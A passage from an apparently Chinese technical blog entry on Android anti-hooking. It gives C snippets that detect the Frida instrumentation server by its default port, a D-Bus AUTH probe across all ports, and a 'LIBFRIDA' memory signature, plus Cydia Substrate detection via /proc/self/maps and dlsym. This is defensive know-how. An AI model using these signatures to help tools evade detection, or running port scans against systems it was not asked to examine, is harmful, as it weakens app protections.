class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">boolean is_frida_server_listening() &#123;</span><br><span class="line">    struct sockaddr_in sa;</span><br><span class="line">    memset(&amp;sa, 0, sizeof(sa));</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(27047);</span><br><span class="line">    inet_aton(&quot;127.0.0.1&quot;, &amp;(sa.sin_addr));</span><br><span class="line">    int sock = socket(AF_INET , SOCK_STREAM , 0);</span><br><span class="line">    if (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -1) &#123;</span><br><span class="line">      /* Frida server detected. Do something… */</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>每个开放的端口发送 D-Bus 的认证消息，哪个端口回复了哪个就是 fridaserver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">for(i = 0 ; i &lt;= 65535 ; i++) &#123;</span><br><span class="line">    sock = socket(AF_INET , SOCK_STREAM , 0);</span><br><span class="line">    sa.sin_port = htons(i);</span><br><span class="line">    if (connect(sock , (struct sockaddr*)&amp;sa , sizeof sa) != -1) &#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_VERBOSE, APPNAME,  &quot;FRIDA DETECTION [1]: Open Port: %d&quot;, i);</span><br><span class="line">        memset(res, 0 , 7);</span><br><span class="line">        // send a D-Bus AUTH message. Expected answer is “REJECT&quot;</span><br><span class="line">        send(sock, &quot;\x00&quot;, 1, NULL);</span><br><span class="line">        send(sock, &quot;AUTH\r\n&quot;, 6, NULL);</span><br><span class="line">        usleep(100);</span><br><span class="line">        if (ret = recv(sock, res, 6, MSG_DONTWAIT) != -1) &#123;</span><br><span class="line">            if (strcmp(res, &quot;REJECT&quot;) == 0) &#123;</span><br><span class="line">               /* Frida server detected. Do something… */</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>内存特征码检测<br>在内存中扫描 frida 的库特征 “gadgets”。例如字符串 “LIBFRIDA”在所有 frida-gadget 和 frida-agent 的版本中都有出现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">static char keyword[] = &quot;LIBFRIDA&quot;;</span><br><span class="line">num_found = 0;</span><br><span class="line">int scan_executable_segments(char * map) &#123;</span><br><span class="line">    char buf[512];</span><br><span class="line">    unsigned long start, end;</span><br><span class="line">    sscanf(map, &quot;%lx-%lx %s&quot;, &amp;start, &amp;end, buf);</span><br><span class="line">    if (buf[2] == &apos;x&apos;) &#123;</span><br><span class="line">        return (find_mem_string(start, end, (char*)keyword, 8) == 1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void scan() &#123;</span><br><span class="line">    if ((fd = my_openat(AT_FDCWD, &quot;/proc/self/maps&quot;, O_RDONLY, 0)) &gt;= 0) &#123;</span><br><span class="line">    while ((read_one_line(fd, map, MAX_LINE)) &gt; 0) &#123;</span><br><span class="line">        if (scan_executable_segments(map) == 1) &#123;</span><br><span class="line">            num_found++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (num_found &gt; 1) &#123;</span><br><span class="line">        /* Frida Detected */</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Substrate"><a href="#Substrate" class="headerlink" title="Substrate"></a>Substrate</h2><p>Substrate适用于对native层的hook</p><h3 id="hook对抗-1"><a href="#hook对抗-1" class="headerlink" title="hook对抗"></a>hook对抗</h3><ol><li>读取/proc/self/maps</li></ol><p>libsubstrate.so和libsubstrate-dvm.so两个文件为Substrate必载入的文件，当进程maps表中出现libsubstrate-dvm.so，可以尝试去load该so文件并调用MSJavaHookMethod方法，它会返回该方法的地址即判定为恶意模块（第三方程序）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void* lookup_symbol(char* libraryname,char* symbolname)  </span><br><span class="line">&#123;</span><br><span class="line">    void *imagehandle = dlopen(libraryname, RTLD_GLOBAL | RTLD_NOW);</span><br><span class="line">    if (imagehandle != NULL)&#123;</span><br><span class="line">        void * sym = dlsym(imagehandle, symbolname);</span><br><span class="line">        if (sym != NULL)&#123;</span><br><span class="line">            return sym; //发现Cydia Substrate相关模块</span><br><span class="line">            &#125;</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol><li>基于特征码的检测</li></ol><p>参考资料：</p><ol><li><a href="http://www.520monkey.com/archives/1028" target="_blank" rel="noopener">http://www.520monkey.com/archives/1028</a>  Native层的Hook神器Cydia Substrate使用详解</li></ol>]]></content>
      
      
      
    </entry>
    
  
  
</search>
